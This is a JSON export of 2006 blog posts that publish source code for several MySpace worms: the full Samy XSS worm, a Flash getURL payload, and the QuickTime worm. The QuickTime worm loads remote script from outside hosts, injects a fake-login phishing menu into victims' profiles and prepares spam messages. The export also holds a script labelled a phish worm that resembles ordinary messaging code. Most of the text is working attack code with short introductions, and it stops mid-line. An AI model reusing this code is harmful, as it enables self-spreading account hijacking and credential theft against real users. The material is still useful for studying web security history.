[
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2006-12-07T04:39:37.000Z",
    "content": "<h3>Samy</h3>\r\n\r\n<p>The first AJAX worm ever was Samy and it hit MySpace in October 2005. Here is the source code of the infamous worm. The worm propagates by taking advantage of MySpace not being able to sanitize JavaScript URLs in styles as it is shown above. The purpose of the worm is to infect other profiles and add Samy to their friends list.</p>\r\n\r\n<pre><code>&lt;div id=mycode style=\"BACKGROUND: url('java\r\nscript:eval(document.all.mycode.expr)')\" expr=\"var B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var C;try{var D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return eval('document.body.inne'+'rHTML')}}function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(var O=0;O&lt;F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;var AS=getQueryParams();var L=AS['Mytoken'];var M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O&gt;0){N+='&'}var Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';var V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);var AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'}var AG;function getHome(){if(J.readyState!=4){return}var AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')}function processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}\"&gt;&lt;/DIV&gt;\r\n</code></pre>\r\n\r\n<p>MySpace, profile</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2006-12-07T06:23:03.000Z",
    "content": "<h3>Random MySpace Phish Worm</h3>\r\n\r\n<p>This is something picked up from packetstorm, a MySpace phish worm.</p>\r\n\r\n<pre><code>var up_sURL=\"http://cache.static.userplane.com/presence\";\r\nvar up_dURL=\"http://feed.presence.userplane.com/presence\";\r\nvar up_wmURL=\"http://www.myspace.com/userplane/ic.cfm\";\r\nvar up_pServ=\"presence.userplane.com\";\r\nfunction up_launch(_1){\r\nup_ow[_1]=up_ow[_1]==undefined?null:up_ow[_1];\r\nif(up_ow[_1]==null||up_ow[_1].opener==undefined){\r\nup_ow[_1]=window.open(up_wmURL+\"?sendType=3&strEncryptedID=\"+up_sid+\"&strDestinationUserID=\"+_1,\"ICWindow_\"+_1,\"width=500,height=475,toolbar=0,directories=0,menubar=0,status=0,location=0,scrollbars=0,resizable=1\");\r\nif(up_ow[_1]==null){\r\nup_notify(_1);\r\n}else{\r\nup_clear(_1,false);\r\n}\r\n}\r\n}\r\nfunction up_clear(_2,_3){\r\nvar l=up_la;\r\nup_la=new Array();\r\nvar _5=false;\r\nwhile(l.length&gt;0){\r\nvar _6=l.pop();\r\nif(_6.uid!=_2){\r\nup_la.push(_6);\r\n}else{\r\n_5=true;\r\n}\r\n}\r\nif(_5||!_3){\r\nframes[\"up_lf\"].location.href=up_dURL+\"/o.php?sid=\"+up_sid+\"&ou=\"+_2+\"&forceClear=\"+(_3?\"true\":\"false\");\r\n}\r\nup_show();\r\n}\r\nfunction up_notify(_7){\r\nvar _8=true;\r\nfor(var i=0;i&lt;up_la.length;i++){\r\nif(up_la[i].uid==_7){\r\n_8=false;\r\n}\r\n}\r\nif(_8){\r\nvar _a=new Object();\r\n_a.uid=_7;\r\n_a.n=\"A website member\";\r\nup_la.push(_a);\r\n}\r\nup_show();\r\n}\r\nfunction up_show(){\r\nvar e=document.getElementById(\"up_nd\");\r\nif(up_la.length&gt;0){\r\nif(up_uid_display!=up_la[0].uid){\r\ne.innerHTML=\"&lt;div style=\\\"text-align:center\\\"&gt;\"+(up_is_win_ie?\"\":\"&lt;table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"&gt;&lt;tr&gt;&lt;td align=\\\"center\\\"&gt;\")+\"&lt;table border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"5\\\"&gt;&lt;tr&gt;&lt;td nowrap align=\\\"center\\\"&gt;&lt;strong style=\\\"font-size:larger;\\\"&gt;Incoming IM Message&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=\\\"center\\\"&gt;\"+up_la[0].n+\" wants to IM you.&lt;br&gt;Would you like to accept?&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td nowrap align=\\\"center\\\"&gt;&lt;a style=\\\"font-size:larger;\\\" href=\\\"\\\" onClick=\\\"javascript: up_launch( '\"+up_la[0].uid+\"' ); return false;\\\"&gt;Yes&lt;/a&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;a style=\\\"font-size:larger;\\\" href=\\\"\\\" onClick=\\\"javascript: up_clear( '\"+up_la[0].uid+\"', true ); return false;\\\"&gt;No&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\"+(up_is_win_ie?\"\":\"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\")+\"&lt;/div&gt;\";\r\nup_uid_display=up_la[0].uid;\r\nup_animate(200);\r\n}\r\n}else{\r\nup_uid_display=\"\";\r\nup_animate(-200);\r\n}\r\n}\r\nfunction up_animate(dY){\r\nvar e=document.getElementById(\"up_nd\");\r\nif(up_divY!=dY||up_la.length&gt;0){\r\nif(up_divY!=dY){\r\nup_divY+=dY&lt;up_divY?-10:10;\r\n}\r\nvar px=up_divY+document.body.scrollTop+\"px\";\r\ne.style.top=px;\r\nclearTimeout(up_at);\r\nup_at=setTimeout(\"up_animate(\"+dY+\")\",33);\r\n}else{\r\ne.style.top=dY;\r\n}\r\n}\r\nfunction up_clean(_f){\r\nvar _10=\"\";\r\nfor(var i=0;i&lt;_f.length;i++){\r\nvar c=_f.charAt(i);\r\nif((c&gt;=\"A\"&&c&lt;=\"Z\")||(c&gt;=\"a\"&&c&lt;=\"z\")||(c&gt;=\"0\"&&c&lt;=\"9\")){\r\n_10+=c;\r\n}else{\r\n_10+=\"_\";\r\n}\r\n}\r\nreturn _10;\r\n}\r\nfunction receiveData(_13){\r\nif(_13!=\"\"){\r\nvar a=_13.split(\",\");\r\nif(a.length&gt;0){\r\nwhile(u=a.shift()){\r\nup_launch(u);\r\n}\r\n}\r\n}\r\n}\r\nfunction URLencode(_15){\r\nreturn escape(_15).replace(/\\+/g,\"%2B\").replace(/\\\"/g,\"%22\").replace(/\\'/g,\"%27\").replace(/\\//g,\"%2F\");\r\n}\r\nfunction up_runPresence(sid,uid){\r\nup_sid=URLencode(sid);\r\nup_divY=-200;\r\nup_la=new Array();\r\nup_ow=new Object();\r\nup_uid_display=\"\";\r\ndocument.write(\"&lt;iframe name=\\\"up_lf\\\" id=\\\"up_lf\\\" style=\\\"position:absolute; top: -200px; z-index:9998; width:100px; height:100px; border: 0px\\\" src=\\\"\\\"&gt;&lt;/iframe&gt;\");\r\ndocument.write(\"&lt;div id=\\\"up_nd\\\" style=\\\"position:absolute; width:250px; z-index:111111; left: 30px; top: -200px; background-color:#eeeeee; border: 1px solid #000000;\\\"&gt;&lt;/div&gt;\");\r\nif(up_sid!=\"\"){\r\nvar _18=\"server=\"+up_pServ+\"&uid=\"+up_sid;\r\ndocument.write(\"&lt;div id=\\\"flash\\\" style=\\\"position:absolute; width:100px; z-index:9996; top: -200px;\\\"&gt;&lt;object classid=\\\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\\\" codebase=\\\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0\\\" id=\\\"presence\\\" width=\\\"1\\\" height=\\\"1\\\" align=\\\"middle\\\"&gt;&lt;param name=\\\"allowScriptAccess\\\" value=\\\"anyDomain\\\" /&gt;&lt;param name=\\\"movie\\\" value=\\\"\"+up_sURL+\"/presence.swf\\\" /&gt;&lt;param name=\\\"quality\\\" value=\\\"high\\\" /&gt;&lt;param name=\\\"bgcolor\\\" value=\\\"#ffffff\\\" /&gt;&lt;param name=\\\"flashvars\\\" value=\\\"\"+_18+\"\\\" /&gt;&lt;embed src=\\\"\"+up_sURL+\"/presence.swf\\\" flashvars=\\\"\"+_18+\"\\\" quality=\\\"high\\\" bgcolor=\\\"#ffffff\\\" width=\\\"1\\\" height=\\\"1\\\" swLiveConnect=true id=\\\"presence\\\" name=\\\"presence\\\" align=\\\"middle\\\" allowScriptAccess=\\\"anyDomain\\\" type=\\\"application/x-shockwave-flash\\\" pluginspage=\\\"http://www.macromedia.com/go/getflashplayer\\\" /&gt;&lt;/object&gt;&lt;/div&gt;\");\r\n}\r\n}\r\nvar up_sid=null;\r\nvar up_divY=null;\r\nvar up_la=null;\r\nvar up_uid_display=null;\r\nvar up_at=null;\r\nvar up_ow=null;\r\nvar up_agt=navigator.userAgent.toLowerCase();\r\nvar up_appVer=navigator.appVersion.toLowerCase();\r\nvar up_is_mac=up_agt.indexOf(\"mac\")!=-1;\r\nvar up_is_safari=up_agt.indexOf(\"safari\")!=-1&&up_is_mac;\r\nvar up_is_khtml=up_is_safari||up_agt.indexOf(\"konqueror\")!=-1;\r\nvar up_is_ie=up_appVer.indexOf(\"msie\")!=-1&&up_agt.indexOf(\"opera\")==-1&&!up_is_khtml;\r\nvar up_is_win=up_is_mac?false:(up_agt.indexOf(\"win\")!=-1||up_agt.indexOf(\"16bit\")!=-1);\r\nvar up_is_win_ie=up_is_win&&up_is_ie;\r\n</code></pre>\r\n\r\n<p>MySpace, phishing</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2006-12-07T06:46:30.000Z",
    "content": "<h3>The infamous MySpace Flash Worm</h3>\n\n<p>The worm works by emebeding flash content that opens a URL once the movie is in action. This is achieved via \"getURL\" method. The getURL redirects the user to a blog page where another flash component opens a javascript URL that is evaluated inside MySpace context. More information about this worm can be found <a href=\"http://blog.taragana.com/index.php/archive/how-myspace-flash-ajax-hack-works/\" rel=\"nofollow\">here</a>.</p>\n\n<p><em>state1: open remote URL</em></p>\n\n<pre><code>getURL(\"url\");</code></pre>\n\n<p><em>stage2: evaluate a javascript URL</em></p>\n\n<pre><code>getURL(\"javas\\n\\rcript: var x = new ActiveXObject(\\'Msxml2.XMLHTTP\\');x.open(\\'GET\\',\\'\nhttp://editprofile.myspace.com/index.cfm?fuseaction=user.HomeComments&amp;friendID=93634373\\',true);\nx.onreadystatechange=function(){if (x.readyState==4){var pg=x.responseText;var sc=pg.substring(pg.indexOf(\\'BX-\\')+3,pg.indexOf(\\'-EX\\'));while((sc.indexOf(\\'&lt;br&gt;\\')!=-1)||(sc.indexOf(\\'-XXX\\')!=-1)){var n=sc.indexOf(\\'&lt;br&gt;\\');if(n==-1)n=sc.indexOf(\\'-XXX\\');sc=sc.substring(0,n)+sc.substring(n+5,sc.length);};\" + \"eval(sc);}};\" + \"x.send(null);\", \"\");</code></pre>\n\n<p>MySpace, flash, getURL</p>"
  },
  {
    "author": "pdp",
    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
    "date": "2006-12-08T03:45:35.000Z",
    "content": "<h3>MySpace QuickTime Worm</h3>\r\n\r\n<p>Billy Hoffman from SPI has an analysis of the MySpace QuickTime Worm <a href=\"http://www.spidynamics.com/spilabs/education/articles/MySpace-QuickTime%20Worm.html\" rel=\"nofollow\">here</a>. The worm makes use of a QuickTime XSS flow discussed <a href=\"http://www.gnucitizen.org/blog/backdooring-quicktime-movies/\" rel=\"nofollow\">here</a>.</p>\r\n\r\n<pre><code>/*\r\n * Source code received from BurntPickle (http://www.myspace.com/burntpickle)\r\n * \r\n * Comments and formating by SPI Dynamics (http://www.spidynamics.com)\r\n * This code may be republished as long as the above text is kept\r\n */\r\n\r\n/*\r\n\r\nThis JavaScript was inside of a Quicktime movie. It uses a\r\nfeature known as HREF tracks (http://www.apple.com/quicktime/tutorials/hreftracks.html)\r\nwhich allows Quicktime to load new movie files, webpages or\r\nrun JavaScript. The worm's author created an empty Quicktime\r\nmovie that contains an HREF grack that would automatically\r\nexecute this JavaScript.\r\n\r\nThis code served as a bootstrap to load the full malware\r\ncode from a 3rd party webserver. This is most likely due to\r\nlength limitations for URLs in HREF tracks. \r\n\r\n*/\r\n\r\njavascript:\r\n\r\nvoid((\r\nfunction() {\r\n    //create a new SCRIPT tag\r\n    var e=window.document.createElement('script');\r\n    var ll=new Array();\r\n    ll[0]='http://www.daviddraftsystem.com/images/';\r\n    ll[1]='http://www.tm-group.co.uk/images/';\r\n    \r\n    //Randomly select a host that is serving the full code\r\n    //of the malware\r\n    var lll=ll[Math.floor(2*(Math.random()%1))];\r\n    //set the SRC attribute to the remote site\r\n    e.setAttribute('src',lll+'js.js');\r\n    //append the SCRIPT tag to the current document. The\r\n    //current document would be whatever webpage contains\r\n    //the embedded movie, in this case, a MySpace profile page\r\n    //This causes the full code of the malware to execute.\r\n    window.document.body.appendChild(e);\r\n})</code></pre>\r\n\r\nThe code downloaded from the randomly selected servers plus comments:\r\n\r\n<pre><code>/*\r\n * Source code received from BurntPickle (http://www.myspace.com/burntpickle)\r\n * \r\n * Comments and formating by SPI Dynamics (http://www.spidynamics.com)\r\n * This code may be republished as long as the above text is kept\r\n */\r\n\r\n//========================================================\r\n//======================================================== Functions\r\n//========================================================\r\n\r\n//It is odd that the author uses both literal JavaScript functions and\r\n//anonymous functions\r\n\r\n/*\r\n doEdit - Edits someone's profile to infect them with the Quicktime file\r\n          and the HTML to overwrite the top menu with a phishing menu\r\nparams:\r\n    oXML - An XHConn object that has received a response\r\nreturns: void\r\n          \r\n*/\r\nvar doEdit=function(oXML){\r\n    //extract the friend id from the current page\r\n\tvar friendid=encodeURIComponent(findContents(oXML,'friendid=','&MyToken=',9));\r\n\r\n\tif(friendid){\r\n\t    //extract the old values for the various profile fields\r\n\t\tvar theviewstate = encodeURIComponent(findContents(oXML,'__VIEWSTATE','\\\" /&gt;', 37));\r\n\t\tvar thehash = encodeURIComponent(findContents(oXML,'editInterests_hash','\\\" /&gt;', 27));\r\n\t\tvar headlinetext = encodeURIComponent(findContents(oXML,'editInterests$HeadlineText','\\\" maxlength', 47));\r\n\t\tvar aboutmetext = encodeURIComponent(findContents(oXML,'editInterests$AboutMeText','&lt;/textarea&gt;', 127));\r\n\t\tvar liketomeettext = encodeURIComponent(findContents(oXML,'editInterests$LikeToMeetText','&lt;/textarea&gt;', 133));\r\n\t\tvar generaltext = encodeURIComponent(findContents(oXML,'editInterests$GeneralText','&lt;/textarea&gt;', 126));\r\n\t\tvar musictext = encodeURIComponent(findContents(oXML,'editInterests$MusicText','&lt;/textarea&gt;', 122));\r\n\t\tvar moviestext = encodeURIComponent(findContents(oXML,'editInterests$MoviesText','&lt;/textarea&gt;', 124));\r\n\t\tvar televisiontext = encodeURIComponent(findContents(oXML,'editInterests$TelevisionText','&lt;/textarea&gt;', 132));\r\n\t\tvar bookstext = encodeURIComponent(findContents(oXML,'editInterests$BooksText','&lt;/textarea&gt;', 122));\r\n\t\tvar heroestext = encodeURIComponent(findContents(oXML,'editInterests$HeroesText','&lt;/textarea&gt;', 124));\r\n\t\tif('%22%20maxleng' == headlinetext) {\r\n\t\t\theadlinetext  = '';\r\n\t\t}\r\n\r\n        //Checking if this profile already has a reference to the quicktime movie, and thus if has this profile\r\n        //already been infected. This is used later\r\n\t\tvar c = moviestext.indexOf(\"piAF2iuswo.mov\");\r\n        \r\n\t\tvar urlpost = 'http://' + document.location.host + '/Modules/ProfileEdit/Pages/Interests.aspx?fuseaction=profile.interests';\r\n\r\n        //Update the profile with our infected content\r\n        //Note that all the controls start with the same prefix. The author could have\r\n        //stored this prefix in a string to make the virus smaller.\r\n\t\tvar postinfo = \"__VIEWSTATE=\" + theviewstate\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24hash=\" + thehash\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24SaveTop=Save+All+Changes\"\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeadlineText=\" + headlinetext\r\n\t\t//Here the HTML for the top menu with Phishing links is inserted into the profile\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24AboutMeText=\" + aboutmetext + cc[0]\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24LikeToMeetText=\" + liketomeettext\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24GeneralText=\" + generaltext\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MusicText=\" + musictext\r\n\t\t//Here a reference to the quicktime movie is inserted\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24MoviesText=\" + moviestext + cc[3]\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24TelevisionText=\" + televisiontext\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24BooksText=\" + bookstext\r\n\t\t+ \"&ctl00%24ctl00%24Main%24ProfileEditContent%24editInterests%24HeroesText=\" + heroestext;\r\n\r\n        //The author is checking if this profile has already been infected. Really, this check should have been\r\n        //perform at the start of function. This would have made the virus faster by not having to perform\r\n        //needless string operations.\r\n\t\tif(-1 == c) {\r\n\t\t    //if profile has not been infected, update the profile with infected content.\r\n\t\t\teditProf.connect(urlpost,\"POST\",postinfo,friendsWrapper);\r\n\t\t}\r\n\t}\r\n};\r\n\r\n/*\r\n doMessage - Tries to send a message to another MySpace user\r\n             with a link to a pornographic website\r\nparams: none\r\nreturns: void\r\n          \r\n*/\r\nfunction domessage() {\r\n    //for all the iframes that were created to send a message\r\n    for(var y=0;y&lt;ap.length;y++) {\r\n\t    if(-1!=window.frames['qtkt'+y].document.body.innerHTML.indexOf('ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox')) {\r\n\t        //populate the subject with a random message\r\n\t\t    window.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$subjectTextBox.value=su[Math.floor(6*(Math.random()%1))];\r\n\t\t\t//insert a pornographic picture which links to a pornographic website\r\n\t\t\twindow.frames['qtkt'+y].document.forms[1].ctl00$ctl00$Main$Main$sendMessageControl$bodyTextBox.value=cc[2];\r\n\r\n\t\t\t//The below line of code would send the message to a MySpace user.\r\n\t\t\t//in the copy of the code I received, this line was commented out\r\n\t\t\t//because of this, it appear the worm didn't actually send the messages\r\n\r\n\t\t\t//window.frames['qtkt'+y].document.forms[1].btnSend.click();\r\n        }\r\n    }\r\n}\r\n\r\n/*\r\nfindContents - Extracts a substring that occurs between two other strings\r\nparams:\r\n    oXML - An XHConn object which has returned a response\r\n    start - first string to look for\r\n    end - string to find that occurs after the start string\r\n    offset - offset between the two string to begin extracting at\r\n\r\nreturns: Extracted contents or an empty string\r\n          \r\n*/\r\nvar findContents=function(oXML,start,end,offset){\r\n\tvar s,e,n;\r\n\ts=oXML.responseText.indexOf(start)\r\n\t//only keep looking if we found the start string\r\n\tif(-1!=s) {\r\n\t\te=oXML.responseText.indexOf(end,s);\r\n\t\tn=oXML.responseText.substring(s+offset,e);\r\n        //this undoes an HTML entity conversion, because the text was reflected inside a Textbox and\r\n        //had entities applied to it when returned from MySpace\r\n\t\treturn n.replace(/&lt;/g,\"&lt;\").replace(/&gt;/g,\"&gt;\").replace(/&quot;/g,\"\\\"\").replace(/&amp;/g,\"&\");\r\n\t}\r\n\treturn '';\r\n};\r\n\r\n/*\r\nfriendsWrapper - Unknown. The source code I received simply had an empty function\r\n                 with a comment. This might just exist because a callback function\r\n                 is needed for the XmlHttpRequest that is made to update the profile\r\n          \r\n*/\r\nvar friendsWrapper=function(oXML){\r\n\t// removed for now\r\n}\r\n\r\n/*\r\nXHConn - Creates a new XHConn object, which extends the XmlHttpRequest object. It\r\n         handles creating an XHR in a cross platform manner, and creates a wrapper\r\n         that handles onreadystatechange.\r\n\r\nreturns: XHConn object\r\n          \r\n*/\r\nfunction XHConn() {\r\n    //this may be a mistake, because these variables\r\n    //are declared as global variables instead of properties\r\n    //of the XHConn object\r\n\tvar xmlhttp, bComplete = false;\r\n\r\n    //Create XHR, regardless of browser\r\n\ttry { xmlhttp = new ActiveXObject(\"Msxml2.XMLHTTP\"); }\r\n\tcatch(e) {\r\n\t\ttry { xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); }\r\n\t\tcatch(e) {\r\n\t\t\ttry { xmlhttp = new XMLHttpRequest(); }\r\n\t\t\tcatch(e) { xmlhttp = false; }\r\n\t\t}\r\n\t}\r\n\tif(!xmlhttp) return null;\r\n\t\r\n\t/*adds a connect method\r\n\t\r\n\t  params:\r\n\t    sURL - URL to send request to\r\n\t    sMethod - HTTP method to use, if not GET, assumes POST\r\n\t    sVars - PARAMETERS\r\n\t    fnDone - function to callback once connection is completed\r\n\t*/\r\n\tthis.connect = function(sURL, sMethod, sVars, fnDone) {\r\n\t\tif(!xmlhttp) return false;\r\n\t\tbComplete = false;\r\n\t\tsMethod = sMethod.toUpperCase();\r\n\t\ttry {\r\n\t\t    //if it is a get, we send no parameters\r\n\t\t\tif(sMethod == \"GET\") {\r\n\t\t\t\txmlhttp.open(sMethod, sURL, true)\r\n\t\t\t\tsVars = \"\";\r\n\t\t\t} else {\r\n\t\t\t    //else sent the appropriate headers for a POST\r\n\t\t\t\txmlhttp.open(sMethod, sURL, true);\r\n\t\t\t\txmlhttp.setRequestHeader(\"Method\",\"POST \"+sURL+\" HTTP/1.1\");\r\n\t\t\t\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\r\n\t\t\t}\r\n\t\t\t//Wrap the onreadystatechange and make sure that that the request has completly returned\r\n\t\t\txmlhttp.onreadystatechange = function() {\r\n\t\t\t    //normally a check for statuscode == 200 is done here, but for some reason they didn't\r\n\t\t\t\tif(xmlhttp.readyState == 4 && !bComplete) {\r\n\t\t\t\t\tbComplete = true;\r\n\t\t\t\t\tfnDone(xmlhttp);\r\n\t\t\t\t}\r\n\t\t\t};\r\n\t\t\t//send the request\r\n\t\t\txmlhttp.send(sVars);\r\n\t\t} catch(z) { return false; }\r\n\t\treturn true;\r\n\t};\r\n\treturn this;\r\n}\r\n\r\n//========================================================\r\n//======================================================== Global Variables\r\n//========================================================\r\n\r\n//the content the worm needed (Phishing pages, malicious Quicktime movie, JavaScript code, etc)\r\n//was stored on multiple servers. The worm randomly selects one to use\r\nvar ll=new Array();\r\nll[0]='http://www.daviddraftsystem.com/images/';\r\nll[1]='http://www.tm-group.co.uk/images/';\r\nvar lll=ll[Math.floor(2*(Math.random()%1))];\r\n\r\n//this is an array containing different phrases to use as the subject of a message to other MySpace\r\n//users\r\nvar su=new Array();\r\nsu[0]='what else is there to do on a Sunday.?.......';\r\nsu[1]='You better not forget about this..';\r\nsu[2]='Hehe that was so funny..';\r\nsu[3]='better see this one last time lol..';\r\nsu[4]='omg did you see this last nite..';\r\nsu[5]='whos coming to the party tonight.?..';\r\n\r\n//This array contains various payloads used by the worm\r\nvar cc=new Array();\r\n//This is the HTML used to hide the old top menu bar and replace it with a menu pointing to a fake login page\r\ncc[0]='&lt;style type=\"text/css\"&gt;\\n'\r\n+'div table td font { display: none }\\n'\r\n+'div div table tr td a.navbar, div div table tr td font { display: none }\\n'\r\n+'.testnav { position:absolute; top: 136px; left:50%; _top: 146px }\\n'\r\n+'&lt;/style&gt;&lt;div style=\"z-index:5; background-color: #6698CB; margin-left:-400px; width: 800px\" align=\"center\" class=\"testnav\"&gt;&lt;div style=\"\"&gt;'\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Home&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Browse&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Search&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Invite&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Film&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Mail&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Blog&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Favorites&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Forum&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Groups&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Events&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Videos&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Music&lt;/a&gt; | &lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Comedy&lt;/a&gt; | '\r\n+'&lt;a href=\"'+lll+'login.html\" target=\"\" class=\"navbar\"&gt;Classifieds&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;'; //profile\r\n//This is the body of the message sent to other MySpace users. It contains a pornographic picture and a link to a pornographic website\r\ncc[2]='&lt;a href=\"http://google.com/url?q=http://www.vidchicks.com/home.php\"&gt;&lt;img border=\"0\" src=\"http://img453.imageshack.us/img453/5603/youtubedt7rf2.jpg\"&gt;'; //mesages\r\n//This is HTML added to a profile with a link to the malicious Quicktime movie. It uses styles to try and hide itself from the user\r\ncc[3]='&lt;div style=\"width: 1px; height: 1px; overflow: hidden; text-indent: -9999px\"&gt;&lt;embed src='+lll+'piAF2iuswo.mov /&gt;&lt;/div&gt;'; // profile inf\r\n\r\n\r\n//========================================================\r\n//======================================================== Code Execution Starts Here\r\n//========================================================\r\n\r\n//Please note that all variables declared here are global variables, as\r\n//JavaScript does not have block level variable scope. This allows functions\r\n//like doMessages() to access variables created here.\r\n\r\n// Malware will execute only if variable editProf is not defined.\r\n// Once the worm runs it defines this variable. This serves as a kill switch\r\n// by preventing the virus from running multiple times on the same page\r\nif((typeof editProf == \"undefined\") 